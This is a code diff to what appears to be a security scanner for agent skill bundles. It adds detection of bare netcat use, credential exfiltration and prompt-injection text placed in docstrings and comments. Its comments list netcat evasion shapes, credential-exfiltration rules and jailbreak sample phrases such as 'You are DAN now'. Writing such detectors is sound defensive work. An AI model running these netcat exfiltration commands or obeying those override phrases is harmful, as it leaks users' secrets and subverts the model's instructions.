+    function; all three were retracted per CLAUDE.md §2.5, documented here rather than
+    attempted a 6th narrow-regex-style iteration:
+
+      - `sudo -u root nc …` — an option VALUE (`root`), not a flag, sits between the
+        wrapper and `nc`. Distinguishing an option's VALUE from a bare positional
+        argument needs per-command flag-arity knowledge (`-u` takes a value on `sudo`,
+        `-name`'s value on `find` sits the same way) this generic token scanner cannot
+        have without becoming unsound for some OTHER wrapper's flags.
+      - general variable-reconstruction (`cmd="n"; cmd+="c"; $cmd …`) — needs real
+        data-flow tracking this per-line, non-parsing scanner has never had.
+      - `xargs nc 4444` with only ONE static numeric argument and no explicit `-I{}`
+        placeholder — relies on xargs's default behavior of APPENDING the piped-in value
+        as the LAST argument, which would actually run `nc 4444 <host>`. Per `nc(1)`,
+        the positional syntax is `nc [flags] [destination] [port]` — destination first —
+        so that argument ORDER is not a functionally valid exfiltration payload in the
+        first place; `xargs -I{} nc {} 4444 …` (explicit placeholder, syntactically
+        correct) is still caught (see tests).
+
+    None of these are a NEW gap this change introduces: the OLD `\\bnc\\b`
+    search-anywhere regex textually matched all three (it doesn't care what follows), so
+    strictly it "caught" them, but the first two were never reachable exploits without a
+    real shell/data-flow engine this scanner doesn't have, and the third isn't a working
+    payload as written. All three remain accepted, documented blind spots of a
+    stdlib-only, non-parsing, per-line shell scanner — not silently dropped."""
+    if "nc" not in line.lower():
+        return False
+    words = _SH_NC_METACHAR_RE.sub(r" \1 ", line).split()
+    for i, tok in enumerate(words):
+        if _sh_nc_word(tok).lower() != "nc":
+            continue
+        if not _sh_nc_command_position(words, i):
+            continue
+        if _sh_nc_arg_follows(words, i):
+            return True
+    return False
+
+
+# B-341: the original false-condemnation repro attributed to THIS check (SkillTrustBench
+# unifi-api.sh, case_01666/case_04964) was `jq -nc --arg password "$PASS"
+# '{...,password:$password}'` matching SHELL_ENV_EXFIL — but the actual trigger turned
+# out to be `_SH_RAW_SOCKET_RE` matching "nc" inside jq's own `-nc` (`-n -c`) combined
+# short-flag cluster, NOT a real credential-var/raw-socket pairing. Once the bare-`nc`
+# matching (now `_sh_bare_nc_invocation`, née the `_SH_OUTBOUND_RE`/`_SH_RAW_SOCKET_RE`
+# lookbehind — see B-430 above) stopped matching a bare `nc` immediately preceded by `-`
+# (a flag cluster on some OTHER command) or `{` (a `${NC}` variable reference), that
+# match no longer fires on `-nc` at all — this SHELL_ENV_EXFIL check is never even
+# reached for it, so both corpus cases are already resolved. VERIFIED empirically against
+# the real fixture content, not assumed.
+#
+# Four independent rounds (C-135) were spent trying to ALSO add quote/jq-template
+# awareness directly to this check specifically, on the (incorrect) assumption that the
+# credential-var-in-jq-template shape itself needed excluding here. Each attempt (a
+# same-line parity count, a blob-wide bash quote-state machine, a narrow jq-`'{...}'`
+# regex, a proper bash lexer) was retracted after breaking some other real case — full
+# history preserved in `checks._vet._redirect_targets_file`'s docstring, whose sibling
+# fix (the comment-line redirect exclusion) DOES have a genuine remaining residual.
+# Nothing from those four rounds landed here: the bare-`nc` narrowing above was
+# sufficient on its own, and this check is otherwise pre-B-341 behavior, unchanged.
 
 
 # B-284: SHELL_EVAL_REMOTE above only covers the INLINE form — `eval "$(curl … http…)"`,
@@ -3826,7 +6183,12 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
         )
 
     for i, raw in enumerate(masked.splitlines(), 1):
-        if _SH_RAW_SOCKET_RE.search(raw) and _SH_CRED_ENV_RE.search(raw):
+        # B-430: the raw-socket check is `_SH_RAW_SOCKET_RE` (ncat/netcat/`/dev/tcp/`,
+        # unambiguous) OR'd with `_sh_bare_nc_invocation` (the token classifier for the
+        # ambiguous bare `nc` — see its docstring above).
+        if (
+            _SH_RAW_SOCKET_RE.search(raw) or _sh_bare_nc_invocation(raw)
+        ) and _SH_CRED_ENV_RE.search(raw):
             add(
                 "SHELL_ENV_EXFIL",
                 "crit",
@@ -3837,16 +6199,21 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
 
     cred_vars = {m.group("var") for m in _SH_CRED_ASSIGN_RE.finditer(masked)}
     for i, raw in enumerate(masked.splitlines(), 1):
-        if not _SH_OUTBOUND_RE.search(raw):
+        # B-430: same OR pattern as above — see _sh_bare_nc_invocation's docstring.
+        if not (_SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw)):
             continue
         if _SH_CRED_FILE_RE.search(raw):
-            add(
-                "SHELL_CRED_EXFIL",
-                "crit",
-                i,
-                "reads a credential file and sends it to an outbound command "
-                "(curl/wget/nc) — credential exfiltration",
-            )
+            # B-415: curl's own TLS-material flags, and the narrow in-cluster
+            # token in an Authorization header aimed at the cluster's own API
+            # server, are legitimate in-cluster auth -- not exfiltration.
+            if not _sh_cred_match_is_incluster_auth_only(raw, masked):
+                add(
+                    "SHELL_CRED_EXFIL",
+                    "crit",
+                    i,
+                    "reads a credential file and sends it to an outbound command "
+                    "(curl/wget/nc) — credential exfiltration",
+                )
             continue
         if any(re.search(r"\$\{?" + re.escape(v) + r"\b", raw) for v in cred_vars):
             add(
@@ -3895,13 +6262,58 @@ _JS_NATIVE_DLOPEN_RE = re.compile(
 )
 
 
+def _js_block_comment_spans(source: str) -> list[tuple[int, int]]:
+    """Every `/* ... */` block-comment span in `source`, as `(start, end)` character
+    offsets (`end` is exclusive, just past the closing `*/`) -- found with a LINEAR
+    `str.find()` scan, never a backtracking lazy-DOTALL regex (B-377).
+
+    The regex this replaced -- `re.findall(r"/\\*(.*?)\\*/", source, flags=re.S)` --
+    degrades to O(openers x filesize): every `/*` that is never closed by a `*/` makes
+    the lazy `.*?` re-scan from that opener all the way to EOF before giving up.
+    ORDINARY JavaScript/TS is full of such openers -- e.g. a tsconfig-style path-mapping
+    block (`"src/*": ["./src/*"]`) has a literal `/*` substring per glob entry with no
+    closing `*/` anywhere -- so a large, completely benign file blew the 15s per-check
+    scan budget (both `check_persona_jailbreak`/B66 and `check_overt_secret_exfil`/B156
+    hit `ScanBudgetExceeded` and degraded to UNKNOWN, pinning a clean config at grade F).
+
+    The moment one `/*` has no closing `*/` anywhere in the remainder of `source`, NO
+    later `/*` can find one either -- its search space is a SUFFIX of that same
+    remainder. So this scan can safely STOP at the first unclosed opener, which exactly
+    matches the old regex's own behavior (an unclosed `/*` was never part of a match
+    there either, and nothing after it could match once the last real `*/` in the file
+    is behind the scan position) -- while doing at most one forward `str.find()` per
+    real comment plus one final failed `str.find()`, i.e. true O(n)."""
+    spans: list[tuple[int, int]] = []
+    pos = 0
+    n = len(source)
+    while pos < n:
+        start = source.find("/*", pos)
+        if start == -1:
+            break
+        end = source.find("*/", start + 2)
+        if end == -1:
+            break  # unclosed -- no later opener can close either; matches old no-match behavior
+        spans.append((start, end + 2))
+        pos = end + 2
+    return spans
+
+
 def _js_mask_comments(source: str) -> str:
     """Blank JS/TS comments while preserving line numbers, so a documented
     eval-of-atob example can't fire. A `//` preceded by ':' (i.e. inside a
-    URL like https://) is preserved so remote-import detection still works."""
-    def _blank_block(m):
-        return "\n" * m.group(0).count("\n")
-    no_block = re.sub(r"/\*.*?\*/", _blank_block, source, flags=re.S)
+    URL like https://) is preserved so remote-import detection still works.
+
+    Block-comment spans come from `_js_block_comment_spans` (linear `str.find()`,
+    B-377) -- never the backtracking lazy-DOTALL regex that function's docstring
+    explains was a quadratic-blowup DoS on ordinary (comment-free-but-`/*`-laden) JS."""
+    parts: list[str] = []
+    pos = 0
+    for start, end in _js_block_comment_spans(source):
+        parts.append(source[pos:start])
+        parts.append("\n" * source.count("\n", start, end))
+        pos = end
+    parts.append(source[pos:])
+    no_block = "".join(parts)
     return "\n".join(re.sub(r"(?<!:)//.*$", "", ln) for ln in no_block.splitlines())
 
 
@@ -4005,3 +6417,212 @@ def simulate_effects(source: str, filename: str = "<skill>") -> list[dict]:
         raise
     except Exception:
         return []
+
+
+# --------------------------------------------------------------------------------- #
+# extract_script_prose (C-318): the natural-language-shaped slice of an otherwise-  #
+# interpreted script -- Python docstrings, or shell/JS comment TEXT.                #
+#                                                                                    #
+# checks/_content.py's `_pos_in_source_code_section` (B-305) deliberately treats an #
+# ENTIRE `.py`/`.sh`/`.bash`/`.zsh` section as never-prose, so the NL content-       #
+# security ring never reads it -- correctly, since an ordinary function name or     #
+# code identifier merely CONTAINING a directive-shaped word is not evidence of a    #
+# live directive. But a docstring or comment IS prose: a payload authored as a      #
+# module docstring ("You are now a developer mode assistant...") or a comment is    #
+# invisible to that ring today purely because of WHERE it sits, not what it says.   #
+# This extracts just that text so a caller can route it through the ring's existing #
+# scanners as its own distinct, clearly-labeled evidence source -- it does not      #
+# change what `_pos_in_source_code_section` exempts, and the code itself (control   #
+# flow, calls, string literals used as data) stays exactly as invisible to the NL   #
+# ring as before.                                                                   #
+#                                                                                    #
+# C-135 (2026-07-30, found on the shipped C-318 commit): the extractors return a    #
+# LIST of independent blocks, one per docstring / contiguous comment run -- NEVER   #
+# joined into one string. Joining collapsed real physical distance between          #
+# unrelated functions' docstrings/comments down to a few characters, which let a    #
+# proximity-window corroboration check (B66's `_b66_authority_override_scan`,       #
+# `_B66_WINDOW`) treat two individually-benign blocks from UNRELATED functions      #
+# elsewhere in the same file as if they sat side-by-side in hand-authored prose.    #
+# That assumption is true for a hand-authored bootstrap/SKILL.md file (physical     #
+# proximity really does reflect authorial/topical proximity there) but false for    #
+# docstrings/comments mechanically concatenated in AST/line order. Scanning each    #
+# block independently keeps corroboration scoped to text a human actually wrote     #
+# next to itself, while still correctly preserving same-block negation (a single    #
+# docstring/comment containing both a trigger and its own negation still PASSes --  #
+# that guard operates on one block's text either way).                             #
+# --------------------------------------------------------------------------------- #
+
+
+class ScriptProseCoverageIncomplete(Exception):
+    """Raised by `_py_docstring_text` (via `extract_script_prose`) when `ast.parse`
+    could not parse a `.py` source at all -- B-377.
+
+    Parseability is Python-VERSION-dependent: PEP 695/701 syntax (e.g. a `type Alias =
+    int` statement) parses cleanly on 3.12+ but raised a `SyntaxError` on 3.9 (this
+    project's CI floor, exercised via `uv run --python 3.9`). The pre-fix code caught
+    that `SyntaxError` and returned `[]` -- the SAME value it returns for "this file
+    genuinely has no docstrings" -- so a malicious docstring authored in modern syntax
+    silently evaded the whole content-security ring on 3.9 with ZERO signal that
+    anything was skipped (Golden Rule #4: report UNKNOWN, never a confident-looking
+    empty result, when state can't be determined).
+
+    Raising instead of returning `[]` lets this reach `checks/__init__.py::run_all`'s
+    existing per-check crash isolation (B-101, `_check_error_finding`), which already
+    degrades a raising check to one honest UNKNOWN finding rather than sinking the
+    audit or silently reporting nothing found -- reusing that already-audited
+    degradation path rather than inventing a second, parallel one."""
+
+
+def _py_docstring_text(source: str) -> list[str]:
+    """Module + class + function/async-function docstrings, as independent blocks in
+    source order -- NEVER joined into one string (see the C-135 module comment above).
+    `ast.parse` only -- never compiled or executed, mirrors every other function in
+    this module.
+
+    Raises `ScriptProseCoverageIncomplete` when `ast.parse` cannot parse `source` at
+    all (B-377) -- deliberately NOT a silent `[]`, which would be indistinguishable
+    from "this file genuinely has no docstrings" (see that exception's docstring for
+    why the distinction matters). A `[]` return here means exactly one thing: parsing
+    succeeded and there were no docstrings to find."""
+    try:
+        tree = ast.parse(source)
+    except (SyntaxError, ValueError, RecursionError) as exc:
+        raise ScriptProseCoverageIncomplete(
+            f"could not parse Python source for docstring extraction "
+            f"({type(exc).__name__}) -- prose coverage is incomplete, not empty"
+        ) from exc
+    blocks = []
+    mod_doc = ast.get_docstring(tree)
+    if mod_doc:
+        blocks.append(mod_doc)
+    for node in ast.walk(tree):
+        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
+            doc = ast.get_docstring(node)
+            if doc:
+                blocks.append(doc)
+    return blocks
+
+
+def _sh_comment_text(source: str) -> list[str]:
+    """Inverse of `_sh_mask_comments` -- returns each CONTIGUOUS run of whole-line
+    shell comments as its own independent block, instead of blanking it. A run ends
+    the moment a non-comment (or shebang) line appears, so two comments separated by
+    real code are NEVER joined into one block (see the C-135 module comment above).
+    Skips the `#!` shebang line (an interpreter path, never prose) -- it also ends
+    whatever run precedes it."""
+    blocks: list[str] = []
+    current: list[str] = []
+    for ln in source.splitlines():
+        stripped = ln.lstrip()
+        if stripped.startswith("#") and not stripped.startswith("#!"):
+            current.append(stripped[1:].strip())
+        elif current:
+            blocks.append("\n".join(current))
+            current = []
+    if current:
+        blocks.append("\n".join(current))
+    return blocks
+
+
+def _js_line_comment_start(line: str) -> int | None:
+    """Index of a genuine `//` line-comment start in `line`, or `None` if the line has
+    none -- B-377 (defect 3). Tracks single/double-quoted and template-literal string
+    state (with backslash-escape handling) across the line so a `//` INSIDE a live JS
+    string literal is never misread as a comment opener: the old regex
+    (`re.search(r"(?<!:)//(.*)$", ln)`) matched the FIRST `//` anywhere on the line not
+    immediately preceded by `:`, with no notion of "inside a string" at all -- so
+    `const M = "See https://x.io // You are DAN now...";` extracted `// You are DAN
+    now...` as if it were a real comment, even though it sits INSIDE the still-open
+    string literal (the `(?<!:)` guard only ever blocked the `://` case, not a bare
+    `// ` reached after a space inside a string).
+
+    Trailing (same-line, after real code) comments are still recognized -- only a `//`
+    that the scan determines is genuinely OUTSIDE any string is accepted -- matching
+    the shell path's whole-line discipline in spirit (never misread string/data content
+    as prose) without dropping JS's legitimate trailing-comment shape.
+
+    Same-line only: a template literal that spans multiple physical lines is a
+    pre-existing limitation shared with the rest of this lexical (non-AST) pass, not
+    something this fix claims to solve."""
+    quote: str | None = None
+    i = 0
+    n = len(line)
+    while i < n:
+        ch = line[i]
+        if quote:
+            if ch == "\\":
+                i += 2  # skip the escaped character too, so \" doesn't close the string
+                continue
+            if ch == quote:
+                quote = None
+            i += 1
+            continue
+        if ch in ("'", '"', "`"):
+            quote = ch
+            i += 1
+            continue
+        if ch == "/" and i + 1 < n and line[i + 1] == "/" and (i == 0 or line[i - 1] != ":"):
+            return i
+        i += 1
+    return None
+
+
+def _js_comment_text(source: str) -> list[str]:
+    """Inverse of `_js_mask_comments` -- returns each block (`/* */`) comment as its
+    own independent block, plus each CONTIGUOUS run of line (`//`) comments as its own
+    independent block. A `//` run ends the moment a non-comment line appears, so two
+    line comments separated by real code are NEVER joined into one block (see the
+    C-135 module comment above).
+
+    Block-comment spans come from `_js_block_comment_spans` -- a linear `str.find()`
+    scan (B-377), never the backtracking lazy-DOTALL regex that made an ordinary
+    `/*`-laden (but comment-free) file like a tsconfig-style path-mapping block blow the
+    scan budget. Line-comment starts come from `_js_line_comment_start`, which is
+    string-literal-aware (B-377) so a `//` sitting inside a live string/URL is never
+    misread as a comment opener -- see that function's docstring for the exact false-
+    positive shape this closes."""
+    blocks: list[str] = [
+        source[start + 2 : end - 2].strip() for start, end in _js_block_comment_spans(source)
+    ]
+    current: list[str] = []
+    for ln in source.splitlines():
+        idx = _js_line_comment_start(ln)
+        if idx is not None:
+            current.append(ln[idx + 2 :].strip())
+        elif current:
+            blocks.append("\n".join(current))
+            current = []
+    if current:
+        blocks.append("\n".join(current))
+    return blocks
+
+
+def extract_script_prose(source: str, ext: str) -> list[str]:
+    """C-318 (closes the PI-001/PE-005 residual gap): the docstring/comment TEXT of a
+    bundled script, as a list of independent BLOCKS -- one per docstring, or per
+    contiguous comment run -- keyed by its extension --
+
+      "py"                    -> one block per docstring (`_py_docstring_text`)
+      "sh"/"bash"/"zsh"       -> one block per comment run (`_sh_comment_text`)
+      "js"/"ts"/"mjs"/"cjs"   -> one block per comment (`_js_comment_text`)
+
+    Returns [] for an unsupported extension or a script with no docstring/comment at
+    all. Blocks are deliberately never joined into one string -- see the C-135 module
+    comment above this function for why (proximity-window corroboration false-firing
+    across unrelated blocks). See the module comment further above for why this is
+    additive evidence, not a change to what `_pos_in_source_code_section` exempts.
+
+    Raises `ScriptProseCoverageIncomplete` for `ext == "py"` when `ast.parse` cannot
+    parse `source` at all (B-377) -- deliberately NOT folded into the `[]` case, which
+    would make "no docstrings" and "could not determine" indistinguishable; see that
+    exception's docstring. The "sh"/"js" paths never raise -- their extraction is
+    lexical (line/comment scanning), not a full parse, so there is no analogous
+    failure mode.
+    """
+    if ext == "py":
+        return _py_docstring_text(source)
+    if ext in ("sh", "bash", "zsh"):
+        return _sh_comment_text(source)
+    if ext in ("js", "ts", "mjs", "cjs"):
+        return _js_comment_text(source)
+    return []
